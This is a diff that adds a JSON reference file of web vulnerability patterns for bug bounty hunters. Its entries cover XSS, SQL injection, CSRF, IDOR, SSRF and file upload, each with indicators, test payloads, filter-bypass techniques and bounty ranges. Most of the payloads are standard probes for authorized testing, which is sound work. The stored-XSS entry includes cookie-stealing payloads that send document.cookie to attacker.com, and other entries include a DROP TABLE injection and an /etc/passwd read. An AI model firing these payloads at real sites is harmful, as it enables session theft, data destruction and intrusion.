@@ -1,0 +1,484 @@
+{
+  "version": "1.0",
+  "description": "Form-specific vulnerability patterns for bounty hunters",
+  "vulnerabilities": {
+    "xss-reflected": {
+      "name": "Reflected Cross-Site Scripting",
+      "owasp": "A03",
+      "cwe": "CWE-79",
+      "severity": "medium",
+      "bounty_range": "$500 - $5,000",
+      "summary": "User input is immediately returned in the response without proper encoding. Input goes in, executes in victim's browser.",
+      "keywords": ["XSS", "reflected XSS", "cross-site scripting", "script injection", "クロスサイトスクリプティング", "反射型XSS"],
+      "indicators": [
+        "Input value appears in page source unchanged",
+        "Search queries displayed on results page",
+        "Error messages include user input",
+        "No Content-Security-Policy header",
+        "Response Content-Type is text/html"
+      ],
+      "form_targets": [
+        "Search forms",
+        "Error pages with user input",
+        "Login forms (username field)",
+        "Contact forms (preview feature)"
+      ],
+      "test_payloads": [
+        "<script>alert(document.domain)</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>",
+        "\"><script>alert(1)</script>",
+        "javascript:alert(1)//",
+        "<body onload=alert(1)>",
+        "'-alert(1)-'",
+        "<details open ontoggle=alert(1)>"
+      ],
+      "bypass_techniques": [
+        "Case variation: <ScRiPt>",
+        "Encoding: &#60;script&#62;",
+        "Double encoding: %253Cscript%253E",
+        "Breaking tag: <scr<script>ipt>",
+        "Event handlers: onerror, onload, onfocus",
+        "Protocol: javascript:, data:, vbscript:"
+      ],
+      "hunter_notes": "Reflected XSS needs user interaction (click link). Stored XSS pays more. Still worth reporting - can chain with other bugs.",
+      "url": "https://owasp.org/www-community/attacks/xss/"
+    },
+    "xss-stored": {
+      "name": "Stored Cross-Site Scripting",
+      "owasp": "A03",
+      "cwe": "CWE-79",
+      "severity": "high",
+      "bounty_range": "$2,000 - $15,000",
+      "summary": "Malicious script is permanently stored on the target server. Every user who views the infected page executes the payload.",
+      "keywords": ["stored XSS", "persistent XSS", "second-order XSS", "格納型XSS", "永続的XSS"],
+      "indicators": [
+        "User-generated content displayed to others",
+        "No output encoding on stored data",
+        "Comments, profiles, messages visible to multiple users",
+        "Admin panels showing user input"
+      ],
+      "form_targets": [
+        "Comment/review forms",
+        "User profile fields (name, bio)",
+        "Forum posts",
+        "Support ticket systems",
+        "File names in upload"
+      ],
+      "test_payloads": [
+        "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>",
+        "<img src=x onerror=this.src='https://attacker.com/'+document.cookie>",
+        "<svg/onload=alert(document.domain)>",
+        "Name: <script>alert('XSS')</script>",
+        "Bio: <img src=x onerror=alert(1)>"
+      ],
+      "bypass_techniques": [
+        "Payload in unusual fields (filename, metadata)",
+        "Bypass client-side validation",
+        "Encode for specific context (HTML, JS, URL)",
+        "Use less common events: onpointerover, onanimationend"
+      ],
+      "hunter_notes": "Stored XSS = bigger impact = higher bounty. If it hits admin panel, could be critical. Document the impact clearly.",
+      "url": "https://owasp.org/www-community/attacks/xss/"
+    },
+    "xss-dom": {
+      "name": "DOM-based Cross-Site Scripting",
+      "owasp": "A03",
+      "cwe": "CWE-79",
+      "severity": "medium",
+      "bounty_range": "$500 - $5,000",
+      "summary": "Vulnerability exists in client-side code. The attack payload is executed as a result of modifying the DOM environment in the victim's browser.",
+      "keywords": ["DOM XSS", "client-side XSS", "JavaScript XSS", "DOM型XSS", "クライアントサイドXSS"],
+      "indicators": [
+        "JavaScript uses location.hash, location.search",
+        "innerHTML or outerHTML usage with user data",
+        "Dynamic code execution with user input",
+        "jQuery html() or append() with user data"
+      ],
+      "form_targets": [
+        "Single-page applications",
+        "JavaScript-heavy forms",
+        "Dynamic content loading",
+        "URL fragment handlers"
+      ],
+      "test_payloads": [
+        "#<img src=x onerror=alert(1)>",
+        "?name=<script>alert(1)</script>",
+        "javascript:alert(document.domain)",
+        "data:text/html,<script>alert(1)</script>"
+      ],
+      "bypass_techniques": [
+        "Break out of string context",
+        "Use different sinks: setTimeout, setInterval",
+        "Prototype pollution to inject",
+        "Postmessage handler exploitation"
+      ],
+      "hunter_notes": "Harder to find but worth it. Use browser dev tools to trace data flow. Check for unsafe jQuery patterns.",
+      "url": "https://owasp.org/www-community/attacks/DOM_Based_XSS"
+    },
+    "sql-injection": {
+      "name": "SQL Injection",
+      "owasp": "A03",
+      "cwe": "CWE-89",
+      "severity": "critical",
+      "bounty_range": "$5,000 - $50,000+",
+      "summary": "Attacker can inject SQL commands through user input to manipulate database queries. Can lead to data theft, modification, or deletion.",
+      "keywords": ["SQL injection", "SQLi", "database injection", "blind SQL", "union injection", "SQLインジェクション", "データベース"],
+      "indicators": [
+        "Error messages revealing SQL syntax",
+        "Single quote causes application error",
+        "Numeric parameters accepted as strings",
+        "Search functionality with complex results"
+      ],
+      "form_targets": [
+        "Login forms (username/password)",
+        "Search forms",
+        "User lookup by ID",
+        "Filtering/sorting parameters",
+        "Any form that queries database"
+      ],
+      "test_payloads": [
+        "' OR '1'='1",
+        "' OR '1'='1'--",
+        "admin'--",
+        "' UNION SELECT NULL,NULL,NULL--",
+        "1; DROP TABLE users--",
+        "' AND SLEEP(5)--",
+        "' OR 1=1#",
+        "1' ORDER BY 1--+"
+      ],
+      "bypass_techniques": [
+        "Case variations: SeLeCt, UnIoN",
+        "Comments: /**/SELECT/**/",
+        "Encoding: CHAR(39) for quote",
+        "Whitespace alternatives: %09, %0a, %0d",
+        "Time-based blind: SLEEP(), BENCHMARK()",
+        "Boolean-based blind: AND 1=1, AND 1=2"
+      ],
+      "hunter_notes": "SQLi in login = auth bypass = critical. Data extraction = critical. Even blind SQLi is high severity. Always test for it.",
+      "url": "https://owasp.org/www-community/attacks/SQL_Injection"
+    },
+    "csrf": {
+      "name": "Cross-Site Request Forgery",
+      "owasp": "A01",
+      "cwe": "CWE-352",
+      "severity": "medium-high",
+      "bounty_range": "$1,000 - $10,000",
+      "summary": "Attacker tricks authenticated user into executing unwanted actions. The browser automatically includes cookies, making the forged request look legitimate.",
+      "keywords": ["CSRF", "XSRF", "request forgery", "session riding", "クロスサイトリクエストフォージェリ", "CSRF攻撃"],
+      "indicators": [
+        "No CSRF token in forms",
+        "Token is predictable or reusable",
+        "Token not validated server-side",
+        "No SameSite cookie attribute",
+        "State-changing GET requests"
+      ],
+      "form_targets": [
+        "Password change forms",
+        "Email change forms",
+        "Money transfer forms",
+        "Account settings",
+        "Admin actions"
+      ],
+      "test_payloads": [
+        "Submit form from different origin",
+        "Remove CSRF token, submit form",
+        "Use another user's CSRF token",
+        "Change request method (POST to GET)",
+        "Submit stale/expired token"
+      ],
+      "bypass_techniques": [
+        "Remove token parameter entirely",
+        "Send empty token",
+        "Use token from different session",
+        "Change Content-Type to avoid checks",
+        "Flash-based CSRF for complex cases"
+      ],
+      "hunter_notes": "CSRF on password/email change = account takeover potential. CSRF on admin actions = high severity. Check SameSite cookie setting first.",
+      "url": "https://owasp.org/www-community/attacks/csrf"
+    },
+    "idor": {
+      "name": "Insecure Direct Object Reference",
+      "owasp": "A01",
+      "cwe": "CWE-639",
+      "severity": "high-critical",
+      "bounty_range": "$2,000 - $50,000+",
+      "summary": "Application exposes internal object references (IDs) without proper authorization checks. Attacker can access other users' data by manipulating references.",
+      "keywords": ["IDOR", "direct object reference", "horizontal privilege escalation", "authorization bypass", "オブジェクト参照", "認可バイパス"],
+      "indicators": [
+        "Sequential/predictable IDs in URLs",
+        "User ID in form hidden fields",
+        "Object IDs in API requests",
+        "No ownership validation on access"
+      ],
+      "form_targets": [
+        "Profile edit forms (user_id parameter)",
+        "Document download (doc_id)",
+        "Order details (order_id)",
+        "Invoice access (invoice_id)",
+        "Settings forms with object reference"
+      ],
+      "test_payloads": [
+        "Change id=123 to id=124",
+        "Increment/decrement numeric IDs",
+        "Try id=1 (often admin)",
+        "Replace UUID with another user's UUID",
+        "Remove ID to see if returns all"
+      ],
+      "bypass_techniques": [
+        "Parameter pollution: id=123&id=124",
+        "Different encoding: base64, hex",
+        "Wrapped reference: {\"id\": 124}",
+        "Array notation: id[]=123&id[]=124",
+        "Change HTTP method (GET vs POST)"
+      ],
+      "hunter_notes": "IDOR with PII exposure = critical. Even accessing non-sensitive data of others is usually high. Check every object reference you see.",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html"
+    },
+    "auth-bypass": {
+      "name": "Authentication Bypass",
+      "owasp": "A07",
+      "cwe": "CWE-287",
+      "severity": "critical",
+      "bounty_range": "$10,000 - $50,000+",
+      "summary": "Mechanisms to bypass authentication and gain unauthorized access. Can result in complete account takeover or access to protected functionality.",
+      "keywords": ["authentication bypass", "login bypass", "auth bypass", "credential bypass", "認証バイパス", "ログインバイパス"],
+      "indicators": [
+        "Response manipulation allows access",
+        "Client-side authentication checks only",
+        "Predictable session tokens",
+        "Authentication in URL parameter"
+      ],
+      "form_targets": [
+        "Login forms",
+        "Admin login panels",
+        "API authentication endpoints",
+        "Password reset flows",
+        "MFA verification forms"
+      ],
+      "test_payloads": [
+        "Remove authentication parameters",
+        "Change response (success/fail)",
+        "Access authenticated endpoints directly",
+        "Manipulate JWT claims",
+        "Null password or username",
+        "Default credentials"
+      ],
+      "bypass_techniques": [
+        "SQL injection in login: ' OR '1'='1",
+        "Force browsing to authenticated pages",
+        "Token prediction or reuse",
+        "Parameter tampering (isAdmin=true)",
+        "Response manipulation",
+        "MFA bypass via backup codes"
+      ],
+      "hunter_notes": "Any auth bypass is critical. Leads directly to account takeover. Document full impact - accessing other users' data, admin functions, etc.",
+      "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema"
+    },
+    "file-upload": {
+      "name": "Unrestricted File Upload",
+      "owasp": "A04",
+      "cwe": "CWE-434",
+      "severity": "high-critical",
+      "bounty_range": "$2,000 - $25,000",
+      "summary": "Application allows uploading files without proper validation. Can lead to remote code execution, XSS, or denial of service.",
+      "keywords": ["file upload", "unrestricted upload", "RCE via upload", "shell upload", "ファイルアップロード", "シェルアップロード"],
+      "indicators": [
+        "File type validation only on extension",
+        "Client-side only validation",
+        "No content-type verification",
+        "Uploaded files accessible via URL"
+      ],
+      "form_targets": [
+        "Profile picture upload",
+        "Document upload",
+        "Resume/CV upload",
+        "Import functionality",
+        "Any file input field"
+      ],
+      "test_payloads": [
+        "shell.php with PHP code",
+        "shell.php.jpg (double extension)",
+        "shell.jpg with PHP content",
+        "shell.pHp (case variation)",
+        ".htaccess to enable PHP",
+        "SVG with XSS payload"
+      ],
+      "bypass_techniques": [
+        "Double extensions: file.php.jpg",
+        "Null byte: file.php%00.jpg",
+        "Content-Type spoofing",
+        "Magic byte manipulation",
+        "Alternative extensions: .phtml, .php5",
+        "Polyglot files (valid image + code)"
+      ],
+      "hunter_notes": "If you can execute code = critical. XSS via uploaded file = medium-high. Look for where uploaded files are served from.",
+      "url": "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"
+    },
+    "open-redirect": {
+      "name": "Open Redirect",
+      "owasp": "A01",
+      "cwe": "CWE-601",
+      "severity": "low-medium",
+      "bounty_range": "$100 - $1,000",
+      "summary": "Application redirects to user-specified URL without validation. Used for phishing attacks or chained with other vulnerabilities.",
+      "keywords": ["open redirect", "URL redirect", "unvalidated redirect", "オープンリダイレクト", "URLリダイレクト"],
+      "indicators": [
+        "Redirect parameter in URL (return, next, url)",
+        "Post-login redirect functionality",
+        "External link warning bypass",
+        "OAuth callback manipulation"
+      ],
+      "form_targets": [
+        "Login forms with redirect parameter",
+        "Logout with return URL",
+        "OAuth authorization flows",
+        "Link shorteners"
+      ],
+      "test_payloads": [
+        "?redirect=https://attacker-site.com",
+        "?next=//attacker-site.com",
+        "?return=https:attacker-site.com",
+        "?url=\\\\attacker-site.com"
+      ],
+      "bypass_techniques": [
+        "Protocol-relative: //attacker.com",
+        "Backslash: \\attacker.com",
+        "URL encoding variations",
+        "Subdomain tricks"
+      ],
+      "hunter_notes": "Low severity alone, but chains well. Open redirect + OAuth = account takeover. Document potential phishing impact.",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html"
+    },
+    "ssrf": {
+      "name": "Server-Side Request Forgery",
+      "owasp": "A10",
+      "cwe": "CWE-918",
+      "severity": "high-critical",
+      "bounty_range": "$5,000 - $50,000+",
+      "summary": "Attacker can make the server send requests to unintended locations. Access internal services, cloud metadata, or perform port scanning.",
+      "keywords": ["SSRF", "server-side request forgery", "internal access", "metadata", "SSRF", "内部アクセス"],
+      "indicators": [
+        "URL parameter fetched by server",
+        "Webhook configuration",
+        "Import from URL feature",
+        "PDF generation from URL"
+      ],
+      "form_targets": [
+        "Profile picture from URL",
+        "Website preview/screenshot",
+        "Document import from URL",
+        "Webhook URL configuration",
+        "URL validation checks"
+      ],
+      "test_payloads": [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://localhost:22",
+        "http://127.0.0.1:8080/admin",
+        "http://[::]:80/",
+        "file:///etc/passwd",
+        "dict://localhost:6379/info"
+      ],
+      "bypass_techniques": [
+        "URL encoding",
+        "Different IP formats: 0177.0.0.1, 2130706433",
+        "DNS rebinding",
+        "Protocol smuggling",
+        "Redirect chain",
+        "IPv6: [::1], [::ffff:127.0.0.1]"
+      ],
+      "hunter_notes": "SSRF to cloud metadata = AWS keys = critical. Even internal port scanning is valuable. Always try cloud metadata endpoints.",
+      "url": "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"
+    },
+    "clickjacking": {
+      "name": "Clickjacking",
+      "owasp": "A01",
+      "cwe": "CWE-1021",
+      "severity": "low-medium",
+      "bounty_range": "$100 - $2,000",
+      "summary": "Attacker embeds target page in invisible iframe and tricks user into clicking hidden elements. Can lead to unintended actions.",
+      "keywords": ["clickjacking", "UI redressing", "iframe", "X-Frame-Options", "クリックジャッキング"],
+      "indicators": [
+        "Missing X-Frame-Options header",
+        "Missing CSP frame-ancestors",
+        "Sensitive actions with single click",
+        "No confirmation dialogs"
+      ],
+      "form_targets": [
+        "One-click actions (delete, transfer)",
+        "Settings changes",
+        "OAuth authorization",
+        "Like/follow buttons"
+      ],
+      "test_payloads": [
+        "Embed in iframe, check if loads",
+        "Create PoC with invisible overlay",
+        "Test frame-busting bypass",
+        "Try sandbox attribute"
+      ],
+      "hunter_notes": "Low severity alone. Higher if impacts sensitive actions. Document what attacker could achieve.",
+      "url": "https://owasp.org/www-community/attacks/Clickjacking"
+    },
+    "rate-limit-bypass": {
+      "name": "Rate Limiting Bypass",
+      "owasp": "A07",
+      "cwe": "CWE-307",
+      "severity": "medium",
+      "bounty_range": "$500 - $5,000",
+      "summary": "Bypassing rate limiting allows brute force attacks, enumeration, or resource exhaustion.",
+      "keywords": ["rate limit", "brute force", "throttling bypass", "レート制限", "ブルートフォース"],
+      "indicators": [
+        "No lockout after failed attempts",
+        "Rate limit on IP only",
+        "No rate limit on API endpoints",
+        "Rate limit reset on parameter change"
+      ],
+      "form_targets": [
+        "Login forms",
+        "Password reset",
+        "OTP verification",
+        "API authentication"
+      ],
+      "test_payloads": [
+        "Add X-Forwarded-For with different IPs",
+        "Change User-Agent between requests",
+        "Add extra parameters to reset counter"
+      ],
+      "bypass_techniques": [
+        "X-Forwarded-For: random IP",
+        "X-Real-IP header rotation",
+        "Email case variations",
+        "Parallel requests"
+      ],
+      "hunter_notes": "Enables brute force attacks. Combined with weak password policy = high severity.",
+      "url": "https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks"
+    },
+    "info-disclosure": {
+      "name": "Information Disclosure",
+      "owasp": "A05",
+      "cwe": "CWE-200",
+      "severity": "low-medium",
+      "bounty_range": "$100 - $2,500",
+      "summary": "Application reveals sensitive information that aids attackers. Includes stack traces, version info, internal paths.",
+      "keywords": ["information disclosure", "info leak", "sensitive data exposure", "情報漏洩", "機密情報"],
+      "indicators": [
+        "Verbose error messages",
+        "Debug mode enabled in production",
+        "Version numbers in headers",
+        "Internal paths in errors"
+      ],
+      "form_targets": [
+        "Error handling in forms",
+        "Debug endpoints",
+        "API responses with extra fields"
+      ],
+      "test_payloads": [
+        "Submit malformed data to trigger errors",
+        "Access debug/diagnostic endpoints",
+        "Check response headers for version info"
+      ],
+      "hunter_notes": "Low severity alone but helps other attacks. Stack traces reveal code paths. Version info enables CVE hunting.",
+      "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/"
+    }
+  }
+}
